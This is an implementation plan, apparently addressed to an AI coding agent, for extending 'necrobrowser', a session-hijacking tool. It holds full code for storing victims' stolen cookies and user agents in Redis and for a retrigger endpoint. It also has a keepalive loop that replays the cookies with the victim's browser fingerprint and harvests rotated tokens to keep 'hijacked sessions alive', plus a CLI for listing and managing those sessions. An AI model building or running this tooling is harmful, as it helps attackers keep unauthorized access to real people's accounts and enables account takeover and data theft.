# Retrigger API, Keepalive, and CLI Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add task retrigger API, implement session keepalive with cookie refresh, and create a CLI tool for necrobrowser.

**Architecture:** Extend the existing Redis task hash with full task metadata (type, taskName, params, userAgent) so tasks can be retriggered from stored data. Implement keepalive as an in-process setInterval loop that queues lightweight page loads through the existing Puppeteer cluster, harvesting fresh cookies after each load. CLI is a standalone commander-based script talking exclusively to the necrobrowser HTTP API.

**Tech Stack:** Node.js, Redis (existing), Express (existing), Puppeteer (existing), commander (new dep), chalk (existing)

---

### Task 1: Extend Redis DB layer with new methods

**Files:**
- Modify: `db/db.js:83-98` (AddTask) and append new methods after line 210

**Step 1: Modify `AddTask` to accept and store full task metadata**

Change the `AddTask` function signature and hSet call at `db/db.js:83-98`:

```javascript
exports.AddTask = async function (name, task, cookies, taskName, params, userAgent) {
    const redisClient = await getClient();
    const id = shortid.generate();

    const key = `task:${task}:${id}`;
    console.log(`[DB] AddTask: Creating task ${key} with name="${name}", status="queued", cookies_length=${cookies.length}`);

    const fields = {
        "name": name,
        "cookies": cookies,
        "status": "queued",
        "type": task,
        "taskName": taskName || '',
        "params": JSON.stringify(params || {}),
        "userAgent": userAgent || '',
        "createdAt": new Date().toISOString()
    };

    // Auto-enable keepalive if params has fixSession
    if (params && params.fixSession) {
        fields["keepalive"] = "enabled";
    }

    await redisClient.hSet(key, fields);

    console.log(`[DB] AddTask: Task ${key} successfully created in Redis`);
    return key;
}
```

**Step 2: Add `GetFullTask` method**

Append after `GetCredentials` (after line 210 in `db/db.js`):

```javascript
exports.GetFullTask = async function (key) {
    const redisClient = await getClient();
    const data = await redisClient.hGetAll(key);
    if (!data || Object.keys(data).length === 0) {
        return null;
    }
    return data;
}
```

**Step 3: Add `GetAllTasks` method**

```javascript
exports.GetAllTasks = async function () {
    const redisClient = await getClient();
    const keys = await redisClient.keys('task:*');

    // Filter to only top-level task keys (not :extruded or :creds sub-keys)
    const taskKeys = keys.filter(k => {
        const parts = k.split(':');
        return parts.length === 3 && parts[0] === 'task';
    });

    const tasks = [];
    for (const key of taskKeys) {
        const data = await redisClient.hGetAll(key);
        if (data && data.status) {
            data._key = key;
            tasks.push(data);
        }
    }
    return tasks;
}
```

**Step 4: Add `UpdateTaskCookies` method**

```javascript
exports.UpdateTaskCookies = async function (key, b64Cookies) {
    const redisClient = await getClient();
    await redisClient.hSet(key, 'cookies', b64Cookies);
    console.log(`[${key}] cookies updated (${b64Cookies.length} bytes b64)`);
}
```

**Step 5: Add `UpdateTaskKeepalive` method**

```javascript
exports.UpdateTaskKeepalive = async function (key, enabled) {
    const redisClient = await getClient();
    await redisClient.hSet(key, 'keepalive', enabled ? 'enabled' : 'disabled');
    console.log(`[${key}] keepalive set to ${enabled ? 'enabled' : 'disabled'}`);
}
```

**Step 6: Add `UpdateTaskLastKeepalive` method**

```javascript
exports.UpdateTaskLastKeepalive = async function (key) {
    const redisClient = await getClient();
    const ts = new Date().toISOString();
    await redisClient.hSet(key, 'lastKeepalive', ts);
    console.log(`[${key}] lastKeepalive updated to ${ts}`);
}
```

**Step 7: Add `GetKeepAliveTasks` method**

```javascript
exports.GetKeepAliveTasks = async function () {
    const allTasks = await exports.GetAllTasks();
    return allTasks.filter(t => {
        if (t.keepalive !== 'enabled') return false;
        if (t.status !== 'completed' && t.status !== 'running') return false;
        try {
            const params = JSON.parse(t.params || '{}');
            return !!params.fixSession;
        } catch (e) {
            return false;
        }
    });
}
```

**Step 8: Commit**

```bash
git add db/db.js
git commit -m "feat: extend Redis DB layer with retrigger and keepalive methods

Add full task metadata to AddTask (type, taskName, params, userAgent).
Add GetFullTask, GetAllTasks, UpdateTaskCookies, UpdateTaskKeepalive,
UpdateTaskLastKeepalive, and GetKeepAliveTasks methods."
```

---

### Task 2: Update POST /instrument to store full task metadata

**Files:**
- Modify: `necrobrowser.js:134-194` (POST /instrument handler)

**Step 1: Update the AddTask call to pass full metadata**

In `necrobrowser.js`, change line 175 from:

```javascript
const taskId = await db.AddTask(name, taskType, b64Cookies);
```

to:

```javascript
const taskId = await db.AddTask(name, taskType, b64Cookies, taskName, taskParams, userAgent);
```

The `userAgent` variable is already declared at line 164 and `taskParams` at line 149 (with UA injected at line 166). The `taskName` is the `task` loop variable from line 146. All variables are already in scope. This is the only line that changes.

**Step 2: Commit**

```bash
git add necrobrowser.js
git commit -m "feat: pass full task metadata to AddTask for retrigger support"
```

---

### Task 3: Add retrigger API endpoint

**Files:**
- Modify: `necrobrowser.js` - add new route after the POST /instrument handler (after line 194)

**Step 1: Add the retrigger endpoint**

Insert the following route after the `POST /instrument` handler (before the error middleware at line 196):

```javascript
    // retrigger an existing task by ID, creating a new task with the same cookies/params
    app.post('/instrument/:id/retrigger', async function (req, res, next) {
        try {
            let id = req.params.id;
            let taskData = await db.GetFullTask(id);

            if (!taskData) {
                return res.status(404).json({'error': `Task ${id} not found`});
            }

            // Validate required fields for retrigger
            if (!taskData.type || !taskData.taskName || !taskData.cookies) {
                return res.status(400).json({
                    'error': 'Task missing retrigger data (type, taskName, or cookies). Only tasks created after this feature was added can be retriggered.'
                });
            }

            let taskType = taskData.type;
            let taskName = taskData.taskName;
            let params = {};
            try {
                params = JSON.parse(taskData.params || '{}');
            } catch (e) {
                return res.status(400).json({'error': 'Failed to parse stored task params'});
            }
            let userAgent = taskData.userAgent || '';

            // Validate task function still exists
            const taskValidation = validation.ValidateTaskExists(necrotask, taskType, taskName);
            if (!taskValidation.valid) {
                return res.status(400).json({'error': taskValidation.error});
            }

            // Decode cookies from base64
            let cookies = [];
            try {
                let cookieJson = Buffer.from(taskData.cookies, 'base64').toString('utf8');
                cookies = JSON.parse(cookieJson);
            } catch (e) {
                return res.status(400).json({'error': 'Failed to decode stored cookies'});
            }

            // Re-encode cookies (they may have been refreshed by keepalive)
            let b64Cookies = Buffer.from(JSON.stringify(cookies, null, 4)).toString('base64');

            // Create new task
            const newTaskId = await db.AddTask(
                taskData.name || 'retrigger',
                taskType,
                b64Cookies,
                taskName,
                params,
                userAgent
            );
            console.log(`[${newTaskId}] retriggered from [${id}] -> type: [${taskType}.${taskName}]`);

            // Queue the task
            const taskFn = eval(`necrotask['${taskType}__Tasks'].${taskName}`);
            const wrappedTaskFn = loader.WrapTaskWithErrorHandler(taskFn, taskType, taskName, db);
            await cluster.queue([newTaskId, cookies, params], wrappedTaskFn);

            res.json({
                'status': 'queued',
                'necroId': newTaskId,
                'retriggeredFrom': id
            });
        } catch (err) {
            console.error(c.red(`[POST /instrument/:id/retrigger] Error: ${err.message}`));
            if (!res.headersSent) {
                res.status(500).json({'error': err.message || 'Internal server error'});
            }
        }
    });
```

**Step 2: Commit**

```bash
git add necrobrowser.js
git commit -m "feat: add POST /instrument/:id/retrigger endpoint"
```

---

### Task 4: Add sessions and keepalive toggle API endpoints

**Files:**
- Modify: `necrobrowser.js` - add routes before the error middleware

**Step 1: Add GET /sessions endpoint**

```javascript
    // list all sessions with cookie counts, domains, status, and keepalive info
    app.get('/sessions', async function (req, res, next) {
        try {
            let allTasks = await db.GetAllTasks();
            let sessions = allTasks.map(t => {
                let cookieCount = 0;
                let domains = [];
                try {
                    let cookieJson = Buffer.from(t.cookies || '', 'base64').toString('utf8');
                    let cookies = JSON.parse(cookieJson);
                    cookieCount = cookies.length;
                    domains = [...new Set(cookies.map(c => c.domain).filter(Boolean))];
                } catch (e) {
                    // cookies not decodable
                }

                let params = {};
                try {
                    params = JSON.parse(t.params || '{}');
                } catch (e) {}

                return {
                    id: t._key,
                    name: t.name || '',
                    type: t.type || '',
                    taskName: t.taskName || '',
                    status: t.status || '',
                    cookieCount: cookieCount,
                    domains: domains,
                    fixSession: params.fixSession || '',
                    userAgent: (t.userAgent || '').substring(0, 80),
                    keepalive: t.keepalive || 'disabled',
                    lastKeepalive: t.lastKeepalive || '',
                    createdAt: t.createdAt || ''
                };
            });

            res.json({sessions: sessions, total: sessions.length});
        } catch (err) {
            next(err);
        }
    });
```

**Step 2: Add keepalive enable/disable endpoints**

```javascript
    // enable keepalive for a task
    app.post('/instrument/:id/keepalive/enable', async function (req, res, next) {
        try {
            let id = req.params.id;
            let taskData = await db.GetFullTask(id);
            if (!taskData) {
                return res.status(404).json({'error': `Task ${id} not found`});
            }
            await db.UpdateTaskKeepalive(id, true);
            res.json({'status': 'ok', 'taskId': id, 'keepalive': 'enabled'});
        } catch (err) {
            next(err);
        }
    });

    // disable keepalive for a task
    app.post('/instrument/:id/keepalive/disable', async function (req, res, next) {
        try {
            let id = req.params.id;
            let taskData = await db.GetFullTask(id);
            if (!taskData) {
                return res.status(404).json({'error': `Task ${id} not found`});
            }
            await db.UpdateTaskKeepalive(id, false);
            res.json({'status': 'ok', 'taskId': id, 'keepalive': 'disabled'});
        } catch (err) {
            next(err);
        }
    });
```

**Step 3: Commit**

```bash
git add necrobrowser.js
git commit -m "feat: add GET /sessions and keepalive toggle endpoints"
```

---

### Task 5: Create the keepalive task function

**Files:**
- Create: `tasks/keepalive/necrotask.js`

**Step 1: Create the keepalive task directory and file**

```bash
mkdir -p tasks/keepalive
```

**Step 2: Write the keepalive task**

Create `tasks/keepalive/necrotask.js`:

```javascript
const necrohelp = require('../helpers/necrohelp')
const db = require('../../db/db')

// KeepAlive loads a task's fixSession URL with its cookies and UA,
// then harvests fresh cookies from the browser and writes them back to Redis.
// This keeps hijacked sessions alive and ensures cookie rotation is handled.
exports.KeepAlive = async ({ page, data: [taskId, cookies, params] }) => {
    const fixSession = params.fixSession;
    console.log(`[${taskId}] keepalive: loading ${fixSession}`);

    try {
        // Set cookies from Redis (these may have been refreshed by a previous keepalive)
        if (cookies && cookies.length > 0) {
            const urlObj = new URL(fixSession);
            await necrohelp.SetCookies(page, cookies, {
                url: urlObj.origin + '/'
            });
        }

        // Configure UA to match the victim's browser fingerprint
        await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);

        // Navigate to fixSession URL
        await page.goto(fixSession, { waitUntil: 'networkidle2', timeout: 30000 });
        await necrohelp.Sleep(2000);

        // Harvest fresh cookies from the browser after page load
        // The server may have rotated tokens via Set-Cookie headers
        const freshBrowserCookies = await page.cookies();

        if (freshBrowserCookies.length > 0) {
            // Merge: use a Map keyed by name+domain+path for dedup
            const cookieMap = new Map();

            // Start with original cookies
            for (const c of cookies) {
                const key = `${c.name}|${c.domain || ''}|${c.path || '/'}`;
                cookieMap.set(key, c);
            }

            // Overwrite/add with fresh browser cookies
            for (const fc of freshBrowserCookies) {
                const key = `${fc.name}|${fc.domain || ''}|${fc.path || '/'}`;
                cookieMap.set(key, fc);
            }

            const mergedCookies = Array.from(cookieMap.values());
            const b64Cookies = Buffer.from(JSON.stringify(mergedCookies, null, 4)).toString('base64');
            await db.UpdateTaskCookies(taskId, b64Cookies);

            console.log(`[${taskId}] keepalive: cookies refreshed (${cookies.length} -> ${mergedCookies.length})`);
        }

        // Take a screenshot as evidence of session being alive
        await necrohelp.ScreenshotCurrentPage(page, taskId);

        // Update keepalive timestamp
        await db.UpdateTaskLastKeepalive(taskId);

        console.log(`[${taskId}] keepalive: completed successfully`);
    } catch (e) {
        console.error(`[${taskId}] keepalive error: ${e.message}`);
        // Don't mark the original task as error - keepalive failure is non-fatal
    }
}
```

**Step 3: Commit**

```bash
git add tasks/keepalive/necrotask.js
git commit -m "feat: add keepalive task with cookie refresh logic"
```

---

### Task 6: Implement the keepalive interval loop in necrobrowser.js

**Files:**
- Modify: `necrobrowser.js` - add keepalive loop after cluster init and route setup, before `app.listen`

**Step 1: Add the keepalive interval**

Insert before the `let host = cfg.platform.host;` line (before line 217 in `necrobrowser.js`):

```javascript
    // ============================================================================
    // Keepalive - periodically refresh sessions to keep them alive
    // ============================================================================
    if (cfg.necro.keepalive && cfg.necro.keepalive.enabled) {
        const keepaliveDelay = (cfg.necro.keepalive.delay || 300) * 1000;
        console.log(c.green(`[keepalive] enabled, interval: ${cfg.necro.keepalive.delay}s`));

        // Load the keepalive task function
        const keepaliveTask = require('./tasks/keepalive/necrotask');
        const keepaliveTaskFn = keepaliveTask.KeepAlive;

        setInterval(async () => {
            try {
                const tasks = await db.GetKeepAliveTasks();
                if (tasks.length === 0) return;

                console.log(c.cyan(`[keepalive] processing ${tasks.length} task(s)`));

                for (const task of tasks) {
                    try {
                        // Decode cookies
                        let cookies = [];
                        try {
                            let cookieJson = Buffer.from(task.cookies || '', 'base64').toString('utf8');
                            cookies = JSON.parse(cookieJson);
                        } catch (e) {
                            console.error(`[keepalive] failed to decode cookies for ${task._key}: ${e.message}`);
                            continue;
                        }

                        let params = {};
                        try {
                            params = JSON.parse(task.params || '{}');
                        } catch (e) {
                            continue;
                        }

                        // Inject userAgent into params for the keepalive task
                        if (task.userAgent) {
                            params.userAgent = task.userAgent;
                        }

                        // Queue keepalive through the cluster
                        await cluster.queue(
                            [task._key, cookies, params],
                            keepaliveTaskFn
                        );

                        console.log(`[keepalive] queued for ${task._key}`);
                    } catch (taskErr) {
                        console.error(c.red(`[keepalive] error queueing ${task._key}: ${taskErr.message}`));
                    }
                }
            } catch (err) {
                console.error(c.red(`[keepalive] interval error: ${err.message}`));
            }
        }, keepaliveDelay);
    }
```

**Step 2: Commit**

```bash
git add necrobrowser.js
git commit -m "feat: implement keepalive interval loop with cookie refresh"
```

---

### Task 7: Install commander and create the CLI tool

**Files:**
- Modify: `package.json` (add commander dependency)
- Create: `necrocli.js`

**Step 1: Install commander**

```bash
npm install commander
```

**Step 2: Create `necrocli.js`**

Create the CLI file in the repo root:

```javascript
#!/usr/bin/env node

const { program } = require('commander');
const c = require('chalk');

const API_BASE = process.env.NECRO_API || 'http://localhost:3000';

async function apiCall(method, path, body) {
    const url = `${API_BASE}${path}`;
    const opts = {
        method: method,
        headers: { 'Content-Type': 'application/json' }
    };
    if (body) {
        opts.body = JSON.stringify(body);
    }
    try {
        const res = await fetch(url, opts);
        const data = await res.json();
        if (!res.ok) {
            console.error(c.red(`Error ${res.status}: ${data.error || JSON.stringify(data)}`));
            process.exit(1);
        }
        return data;
    } catch (err) {
        console.error(c.red(`Failed to connect to ${url}: ${err.message}`));
        process.exit(1);
    }
}

program
    .name('necrocli')
    .description('NecroBrowser CLI - session hijacking management')
    .version('1.0.0')
    .option('--host <url>', 'NecroBrowser API URL', API_BASE);

program.on('option:host', function() {
    // Override API_BASE when --host is used
});

function getApiBase() {
    const host = program.opts().host;
    return host || API_BASE;
}

// stats command
program
    .command('stats')
    .description('Show cluster status, queue size, workers, and error rate')
    .action(async () => {
        const data = await apiCall('GET', '/');
        console.log(c.red('\n--- NecroBrowser Stats ---\n'));
        console.log(`  Started:  ${data.startedAt || 'N/A'}`);
        console.log(`  Workers:  ${data.workers || '0'}`);
        console.log(`  Queued:   ${data.queued || '0'}`);
        console.log(`  Progress: ${data.progress || 'N/A'}`);
        console.log(`  Errors:   ${data.errors || '0'}`);
        if (data.tasks && data.tasks.length > 0) {
            console.log(c.cyan('\n  Active tasks:'));
            data.tasks.forEach(t => console.log(`    ${t}`));
        }
        console.log('');
    });

// sessions command
program
    .command('sessions')
    .description('List all hijacked sessions with cookie counts and domains')
    .action(async () => {
        const data = await apiCall('GET', '/sessions');
        const sessions = data.sessions || [];

        console.log(c.red(`\n--- Hijacked Sessions (${data.total || 0}) ---\n`));

        if (sessions.length === 0) {
            console.log('  No sessions found.\n');
            return;
        }

        // Group by status
        const byStatus = {};
        sessions.forEach(s => {
            const st = s.status || 'unknown';
            if (!byStatus[st]) byStatus[st] = [];
            byStatus[st].push(s);
        });

        for (const [status, list] of Object.entries(byStatus)) {
            const statusColor = status === 'completed' ? c.green
                              : status === 'running' ? c.cyan
                              : status === 'error' ? c.red
                              : c.yellow;
            console.log(statusColor(`  [${status.toUpperCase()}] (${list.length})`));

            list.forEach(s => {
                const kaIcon = s.keepalive === 'enabled' ? c.green('KA') : c.gray('--');
                const lastKa = s.lastKeepalive ? ` last:${s.lastKeepalive.substring(0, 19)}` : '';
                console.log(`    ${c.white(s.id)}`);
                console.log(`      type: ${s.type}.${s.taskName}  cookies: ${s.cookieCount}  ${kaIcon}${lastKa}`);
                if (s.domains.length > 0) {
                    console.log(`      domains: ${s.domains.join(', ')}`);
                }
                if (s.fixSession) {
                    console.log(`      fixSession: ${s.fixSession}`);
                }
            });
            console.log('');
        }
    });

// tasks command
program
    .command('tasks')
    .description('List available task types and methods')
    .action(async () => {
        const data = await apiCall('GET', '/tasks');
        console.log(c.red('\n--- Available Tasks ---\n'));
        for (const [type, methods] of Object.entries(data)) {
            console.log(`  ${c.white(type)}:`);
            if (Array.isArray(methods)) {
                methods.forEach(m => console.log(`    - ${m}`));
            }
        }
        console.log('');
    });

// retrigger command
program
    .command('retrigger <taskId>')
    .description('Retrigger a task by ID (creates new task with same cookies/params)')
    .action(async (taskId) => {
        console.log(c.cyan(`\nRetriggering ${taskId}...`));
        const data = await apiCall('POST', `/instrument/${taskId}/retrigger`);
        console.log(c.green(`  New task queued: ${data.necroId}`));
        console.log(`  Retriggered from: ${data.retriggeredFrom}`);
        console.log('');
    });

// status command
program
    .command('status <taskId>')
    .description('Get status and results for a specific task')
    .action(async (taskId) => {
        const data = await apiCall('GET', `/instrument/${taskId}`);
        console.log(c.red(`\n--- Task ${taskId} ---\n`));
        const statusColor = data.status === 'completed' ? c.green
                          : data.status === 'running' ? c.cyan
                          : data.status === 'error' ? c.red
                          : c.yellow;
        console.log(`  Status: ${statusColor(data.status)}`);
        if (data.data) {
            if (typeof data.data === 'string') {
                console.log(`  Info: ${data.data}`);
            } else if (Array.isArray(data.data)) {
                console.log(`  Results: ${data.data.length} entries`);
                data.data.forEach((entry, i) => {
                    if (entry.url) {
                        console.log(`    [${i}] ${entry.url}`);
                    }
                });
            }
        }
        console.log('');
    });

// keepalive command group
const keepalive = program
    .command('keepalive')
    .description('Manage session keepalive');

keepalive
    .command('enable <taskId>')
    .description('Enable keepalive for a task')
    .action(async (taskId) => {
        const data = await apiCall('POST', `/instrument/${taskId}/keepalive/enable`);
        console.log(c.green(`\n  Keepalive enabled for ${data.taskId}\n`));
    });

keepalive
    .command('disable <taskId>')
    .description('Disable keepalive for a task')
    .action(async (taskId) => {
        const data = await apiCall('POST', `/instrument/${taskId}/keepalive/disable`);
        console.log(c.yellow(`\n  Keepalive disabled for ${data.taskId}\n`));
    });

program.parse();
```

**Step 3: Make it executable**

```bash
chmod +x necrocli.js
```

**Step 4: Add a `cli` script to `package.json`**

In `package.json` `scripts` section, add:

```json
"cli": "node necrocli.js"
```

**Step 5: Commit**

```bash
git add necrocli.js package.json package-lock.json
git commit -m "feat: add necrocli - CLI tool for necrobrowser management"
```

---

### Task 8: Manual integration test

**Files:** None (verification only)

**Step 1: Verify the CLI help works**

```bash
node necrocli.js --help
```

Expected: Shows all commands (stats, sessions, tasks, retrigger, status, keepalive).

**Step 2: Verify task loader still picks up keepalive task**

```bash
node -e "const loader = require('./tasks/loader'); const tasks = loader.LoadTasks(); console.log(JSON.stringify(Object.keys(tasks), null, 2));"
```

Expected: Should list `keepalive` among the task types along with existing ones (generic, office365, etc).

**Step 3: Verify the CLI commands against a running necrobrowser instance (if available)**

```bash
node necrocli.js stats
node necrocli.js sessions
node necrocli.js tasks
```

**Step 4: Final commit with any fixes**

```bash
git add -A
git commit -m "feat: finalize retrigger API, keepalive, and CLI integration"
```
